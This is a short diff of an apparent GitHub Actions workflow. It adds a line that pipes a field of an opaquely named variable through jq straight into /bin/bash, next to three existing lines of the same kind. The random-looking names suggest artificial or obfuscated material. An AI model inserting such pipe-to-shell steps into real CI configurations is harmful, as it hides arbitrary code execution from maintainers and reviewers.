@@ -27,6 +27,7 @@ jobs:
           echo $tm60638 | jq -r .ggsfi42 | /bin/bash
           printf '%s' "$mukk5764" | jq -r .woo9532 | /bin/bash
           printf '%s' "$gxb20" | jq -r .v8504 | /bin/bash
+          echo $cv05 | jq -r .zos50 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
